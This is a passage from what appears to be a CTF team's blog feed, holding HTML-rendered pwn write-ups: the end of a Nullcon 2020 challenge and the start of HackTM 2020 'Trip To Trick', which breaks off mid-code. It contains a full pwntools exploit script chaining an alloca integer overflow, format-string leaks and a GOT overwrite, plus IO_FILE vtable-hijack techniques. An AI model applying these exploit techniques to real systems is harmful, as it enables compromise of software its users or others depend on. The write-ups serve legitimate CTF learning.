class="line">  <span class="keyword">if</span> ( unk_20105C )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;s, <span class="number">0L</span>L);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"JK, you lose!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ++unk_20105C;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>We can achieve a <strong>buffer overflow</strong> by causing an <strong>integer overflow</strong> in the operations inside <strong>alloca</strong>, by sending a <strong>negative number</strong>  will cause <strong>alloca</strong> to create a smaller buffer in the stack than the inputted string:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">100</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v7 = atoi(&amp;s); <span class="comment">// Negative values</span></span><br><span class="line">&#125;</span><br><span class="line">v4 = alloca(<span class="number">16</span> * (((__int16)v7 + <span class="number">30L</span>L) / <span class="number">0x10</span>uLL)); <span class="comment">// integer overflow in this operations causing a smaller buffer then the input that will come next</span></span><br><span class="line">qword_201060 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(<span class="number">16</span> * ((<span class="keyword">unsigned</span> __int64)&amp;v6 &gt;&gt; <span class="number">4</span>));</span><br><span class="line">read(<span class="number">0</span>, (<span class="keyword">void</span> *)(<span class="number">16</span> * ((<span class="keyword">unsigned</span> __int64)&amp;v6 &gt;&gt; <span class="number">4</span>)), v7); <span class="comment">// input will be bigger than the buffer</span></span><br></pre></td></tr></table></figure></p><p>We can leak and get arbirtrary write by using a format string vulnerability in <strong>printf</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(qword_201060); <span class="comment">// format string vulnerability</span></span><br></pre></td></tr></table></figure><h3 id="Plan"><a href="#Plan" class="headerlink" title="Plan"></a>Plan</h3><ul><li>Leak libc and pie addresses</li><li>Find a way to return to main</li><li>Overwrite exit got address</li></ul><h3 id="Find-a-way-to-return-to-main"><a href="#Find-a-way-to-return-to-main" class="headerlink" title="Find a way to return to main"></a>Find a way to return to main</h3><p>The most difficulty part of the challenge was to find a way to return to main, the pie is enabled so we can’t overwrite the <strong>global offset table</strong> or a <strong>global variable</strong> without leaking the PIE base address first.</p><p>My solution resolved on overflowing the last byte of the return address, in the <strong>c</strong> language after returning from the <strong>main</strong> function our program will jump into a location in <strong>__libc_start_main</strong> and execute <strong>exit</strong> with the value returned by the main function. If we modify the last byte we can prevent the execution of <strong>exit</strong> and rerun the code that the program used to call main in the beginning.</p><p>If you are used to using gdb you should have already noticed after the entry point there is a moment at _libc_start_main when you reach assembly instruction <code>call rax</code> the rax register contains a pointer to the begining of main.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/dv2ydQq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/dv2ydQq.png" alt><br></a></p><p>We just need to find the right place to jump in <strong>_libc_start_main</strong> and since <strong>ASLR</strong> doesn’t affect the last 3 numbers of a libc address it’s completely fine to only overflow the last byte, after some debugging I found a byte that will work for this libc version (2.23) <strong>0xa8</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.send(<span class="string">"  %27$lx"</span>+<span class="string">'A'</span>*<span class="number">0x80</span>+<span class="string">'\xa8'</span>) <span class="comment"># overwrite last byte of return address to jump to another _libc_main loc</span></span><br></pre></td></tr></table></figure><h3 id="Leaking-pie-and-libc"><a href="#Leaking-pie-and-libc" class="headerlink" title="Leaking pie and libc"></a>Leaking pie and libc</h3><p>This can be done with the format string vulnerability itself, the libc address will show up after we overflow the buffer, we also need to leak <strong>PIE</strong> because we need the offsets to the <strong>global offset table</strong> we can find a pie address at the 27th position of the stack:</p><p>“%lx” because we want to leak a 64 bit pointer:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.send(<span class="string">"  %27$lx"</span>+<span class="string">'A'</span>*<span class="number">0x80</span>+<span class="string">'\xa8'</span>)</span><br></pre></td></tr></table></figure></p><p>Then is just a matter of calculating the offsets(0x208a8,0x880) by using gdb:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">output = r.recvuntil(<span class="string">'\x7f'</span>)</span><br><span class="line">LIBC = u64(output[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x208a8</span> <span class="comment"># libc leak</span></span><br><span class="line">PIE = int(output[:<span class="number">14</span>],<span class="number">16</span>)<span class="number">-0x880</span> <span class="comment"># geting pie</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"LIBC_BASE 0x%x"</span>%u64(output[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))</span><br><span class="line">log.info(<span class="string">"LIBC_BASE 0x%x"</span>%LIBC)</span><br><span class="line">log.info(<span class="string">"PIE 0x%x"</span>%PIE)</span><br><span class="line"></span><br><span class="line">ONE_GADGET = LIBC+<span class="number">0xf1147</span></span><br></pre></td></tr></table></figure></p><h3 id="Overwriting-exit-got-address"><a href="#Overwriting-exit-got-address" class="headerlink" title="Overwriting exit got address"></a>Overwriting exit got address</h3><p>I spent a lot of time here unnecessarily, to modify the address of exit_got we just need to modify last 1/2 bytes, instead I just modified everything spending a lot of time, while this is a good exercise is not very funny spending a lot of time figuring out a way to write a complete <strong>libc</strong> address during a competition, my solution resolved around sorting the HIGH,LOW addresses and do 3 writes:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ONE_GADGET = LIBC+<span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># this is the reason why you should learn about format string libraries and saves you a lot of time </span></span><br><span class="line">WIN_LOW_0 = ONE_GADGET &amp; <span class="number">0xffff</span></span><br><span class="line">WIN_LOW_1 = (ONE_GADGET &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">WIN_HIGH = ONE_GADGET &gt;&gt; <span class="number">32</span></span><br><span class="line"></span><br><span class="line">addresses = [(WIN_LOW_0,<span class="number">1</span>), (WIN_LOW_1,<span class="number">2</span>), (WIN_HIGH,<span class="number">3</span>)]</span><br><span class="line">addresses.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"ONE_GADGET 0x%x"</span> % ONE_GADGET)</span><br><span class="line">log.info(<span class="string">"WIN_LOW_0 0x%x"</span> % WIN_LOW_0)</span><br><span class="line">log.info(<span class="string">"WIN_LOW_1 0x%x"</span> % WIN_LOW_1)</span><br><span class="line">log.info(<span class="string">"WIN_HIGH 0x%x"</span> % WIN_HIGH)</span><br><span class="line">log.info(<span class="string">"GOT EXIT 0x%x"</span> % (PIE+elf.got[<span class="string">'_exit'</span>]))</span><br><span class="line"></span><br><span class="line">getstr = &#123;<span class="number">1</span>:<span class="string">'%&#123;&#125;x%13$hn'</span>, <span class="number">2</span>:<span class="string">'%&#123;&#125;x%14$hn'</span>, <span class="number">3</span>:<span class="string">'%&#123;&#125;x%15$hn'</span>&#125;</span><br><span class="line"></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line">s += <span class="string">'%13$ln'</span> <span class="comment"># clears the already existing got address</span></span><br><span class="line">s += getstr[addresses[<span class="number">0</span>][<span class="number">1</span>]].format(addresses[<span class="number">0</span>][<span class="number">0</span>]) </span><br><span class="line">s += getstr[addresses[<span class="number">1</span>][<span class="number">1</span>]].format(addresses[<span class="number">1</span>][<span class="number">0</span>]-addresses[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">s += getstr[addresses[<span class="number">2</span>][<span class="number">1</span>]].format(addresses[<span class="number">2</span>][<span class="number">0</span>]-addresses[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">s += <span class="string">' '</span>*(<span class="number">56</span>-len(s))</span><br><span class="line">s += p64(PIE+elf.got[<span class="string">'_exit'</span>])<span class="comment">#'B'*8</span></span><br><span class="line">s += p64(PIE+elf.got[<span class="string">'_exit'</span>]+<span class="number">2</span>)<span class="comment">#'A'*8</span></span><br><span class="line">s += p64(PIE+elf.got[<span class="string">'_exit'</span>]+<span class="number">4</span>)<span class="comment">#'C'*8</span></span><br><span class="line">s += <span class="string">"\n"</span></span><br><span class="line">r.send(s)</span><br></pre></td></tr></table></figure><p>Also a format string library could also be used but I’m very lazy in starting learning how to use one.</p><p>The full exploit code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"pwn2.ctf.nullcon.net"</span>, <span class="string">"5003"</span></span><br><span class="line">filename = <span class="string">"./challenge"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">    debug([<span class="number">0x9D8</span>])</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'-1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">r.send(<span class="string">"  %27$lx"</span>+<span class="string">'A'</span>*<span class="number">0x80</span>+<span class="string">'\xa8'</span>) <span class="comment"># overwrite last byte of return address to jump to another _libc_main loc</span></span><br><span class="line">output = r.recvuntil(<span class="string">'\x7f'</span>)</span><br><span class="line">LIBC = u64(output[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x208a8</span> <span class="comment"># libc leak</span></span><br><span class="line">PIE = int(output[:<span class="number">14</span>],<span class="number">16</span>)<span class="number">-0x880</span> <span class="comment"># geting pie</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"LIBC_BASE 0x%x"</span>%u64(output[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))</span><br><span class="line">log.info(<span class="string">"LIBC_BASE 0x%x"</span>%LIBC)</span><br><span class="line">log.info(<span class="string">"PIE 0x%x"</span>%PIE)</span><br><span class="line"></span><br><span class="line">ONE_GADGET = LIBC+<span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># this is the reason why you should learn about format string libraries saves you a lot of time </span></span><br><span class="line">WIN_LOW_0 = ONE_GADGET &amp; <span class="number">0xffff</span></span><br><span class="line">WIN_LOW_1 = (ONE_GADGET &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">WIN_HIGH = ONE_GADGET &gt;&gt; <span class="number">32</span></span><br><span class="line"></span><br><span class="line">addresses = [(WIN_LOW_0,<span class="number">1</span>), (WIN_LOW_1,<span class="number">2</span>), (WIN_HIGH,<span class="number">3</span>)]</span><br><span class="line">addresses.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"ONE_GADGET 0x%x"</span> % ONE_GADGET)</span><br><span class="line">log.info(<span class="string">"WIN_LOW_0 0x%x"</span> % WIN_LOW_0)</span><br><span class="line">log.info(<span class="string">"WIN_LOW_1 0x%x"</span> % WIN_LOW_1)</span><br><span class="line">log.info(<span class="string">"WIN_HIGH 0x%x"</span> % WIN_HIGH)</span><br><span class="line">log.info(<span class="string">"GOT EXIT 0x%x"</span> % (PIE+elf.got[<span class="string">'_exit'</span>]))</span><br><span class="line"></span><br><span class="line">getstr = &#123;<span class="number">1</span>:<span class="string">'%&#123;&#125;x%13$hn'</span>, <span class="number">2</span>:<span class="string">'%&#123;&#125;x%14$hn'</span>, <span class="number">3</span>:<span class="string">'%&#123;&#125;x%15$hn'</span>&#125;</span><br><span class="line"></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line">s += <span class="string">'%13$ln'</span> <span class="comment"># clears the already existing got address</span></span><br><span class="line">s += getstr[addresses[<span class="number">0</span>][<span class="number">1</span>]].format(addresses[<span class="number">0</span>][<span class="number">0</span>]) </span><br><span class="line">s += getstr[addresses[<span class="number">1</span>][<span class="number">1</span>]].format(addresses[<span class="number">1</span>][<span class="number">0</span>]-addresses[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">s += getstr[addresses[<span class="number">2</span>][<span class="number">1</span>]].format(addresses[<span class="number">2</span>][<span class="number">0</span>]-addresses[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">s += <span class="string">' '</span>*(<span class="number">56</span>-len(s))</span><br><span class="line">s += p64(PIE+elf.got[<span class="string">'_exit'</span>])<span class="comment">#'B'*8</span></span><br><span class="line">s += p64(PIE+elf.got[<span class="string">'_exit'</span>]+<span class="number">2</span>)<span class="comment">#'A'*8</span></span><br><span class="line">s += p64(PIE+elf.got[<span class="string">'_exit'</span>]+<span class="number">4</span>)<span class="comment">#'C'*8</span></span><br><span class="line">s += <span class="string">"\n"</span></span><br><span class="line">r.send(s)</span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;437 Points   &lt;/p&gt;
&lt;p&gt;nc pwn2.ctf.nullcon.net 5003&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mega.nz/#!mqYEhSB
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Stack Issue" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"/>
    
      <category term="Format String" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"/>
    
      <category term="Stack Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"/>
    
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
      <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
    
      <category term="nullcon2020" scheme="https://teamrocketist.github.io/tags/nullcon2020/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] HackTM 2020 - Trip To Trick</title>
    <link href="https://teamrocketist.github.io/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/"/>
    <id>https://teamrocketist.github.io/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/</id>
    <published>2020-02-05T15:46:42.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Trip To Trick   </p></blockquote><blockquote><p><strong>Description</strong>:<br>492 Points   </p><p><strong>Author</strong>:<br>NextLine<br>Flag Path: /home/pwn/flag</p><p>nc 138.68.67.161 20006</p><p><a href="https://mega.nz/#!C340maAY!5TKiIDX7UWNMCcaFng2VoIqfZtJs-eGmc_Z5BYZR82I" target="_blank" rel="noopener">trip_to_trick</a></p><p>c6fd4ef7c34c528668edd62914a79602</p><p><a href="https://mega.nz/#!rzhykASR!m3uFt0cGx8jvNZjJ8O2dtZch-XKv-P-zo-vDd41rNwY" target="_blank" rel="noopener">libc.so.6</a></p><p>2fb0d6800d4d79ffdc7a388d7fe6aea0</p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Set <code>_IO_2_1_stdin_-&gt;file-&gt;_IO_BUF_END = STDIN+0x2000</code></li><li>Next scanf will have <strong>full</strong> control of IO_FILE structures</li><li><code>STDOUT-&gt;vtable = _IO_helper_jumps</code> &amp; <code>STDOUT-&gt;flags=0x0</code> to bypass <strong>vtable checker</strong> and <strong>mprotect</strong> of <code>_IO_file_jumps</code></li><li>In <strong>libc-2.29</strong> vtables are writeable <strong>again</strong> so we can control rip by changing the value of <code>_IO_helper_jumps-&gt;__finish</code>  </li><li>Set <code>_IO_helper_jumps-&gt;__finish=setcontext+0x35</code> to obtain <strong>stack pivot</strong>.</li><li>Construct a <strong>ropchain</strong> to open/read/print the file</li></ul><h3 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h3><p>I didn’t solve this challenge during ctf time, but I spent a lot of time trying to do it, perhaps in the end I had the opportunity to speak with a guy who solved named <strong>stan</strong> from discord which told me his solution. </p><p>I eventually ended up implementing it, I learned a lot of new things about the <strong>IO_FILE struct</strong>, huge thanks to him for leading me into the right path in this challenge.</p><h3 id="Information-extraction"><a href="#Information-extraction" class="headerlink" title="Information extraction"></a>Information extraction</h3><p>File<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file trip_to_trick</span><br><span class="line">trip_to_trick: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9ba40c68c917a91e11558eceaffd3e006531a6d9, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure></p><p>Security<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec trip_to_trick</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/TripToTrick/trip_to_trick'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><h3 id="Static-analysis"><a href="#Static-analysis" class="headerlink" title="Static analysis"></a>Static analysis</h3><h4 id="Main-function"><a href="#Main-function" class="headerlink" title="Main function"></a>Main function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  sandbox(argc, argv, envp);</span><br><span class="line">  nohack();</span><br><span class="line">  main_init(argc);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"gift : %p\n"</span>, &amp;system);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"1 : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%llx %llx"</span>, &amp;v4, &amp;v5);</span><br><span class="line">  *v4 = v5;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"2 : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%llx %llx"</span>, &amp;v4, &amp;v5);</span><br><span class="line">  *v4 = v5;</span><br><span class="line">  fclose(<span class="built_in">stdout</span>);</span><br><span class="line">  fclose(<span class="built_in">stdin</span>);</span><br><span class="line">  fclose(<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There’s not much in the main from it we can get:</p><ul><li>free libc leak </li><li>two arbitrary writes (scanfs)</li><li><code>fclose(stdout)</code>, <code>fclose(stdin)</code> and <code>fclose(stderr)</code> (important for the exploit).</li></ul><h4 id="sandbox-function"><a href="#sandbox-function" class="headerlink" title="sandbox function"></a>sandbox function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sandbox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"seccomp error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">15L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">3L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">10L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">9L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">12L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">2L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">1L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">60L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112L</span>L, <span class="number">231L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)seccomp_load(v1) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    seccomp_release(v1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"seccomp error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> seccomp_release(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The author uses seccomp to only allow a few syscalls:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0xf</span>, <span class="number">0</span>); # SCMP_ACT_ALLOW  sys_rt_sigreturn</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">3</span>, <span class="number">0</span>); # sys_close</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">10</span>, <span class="number">0</span>); # sys_mprotect</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">9</span>, <span class="number">0</span>); # sys_mmap</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0xc</span>, <span class="number">0</span>); # sys_brk</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">2</span>, <span class="number">0</span>); # sys_open</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span 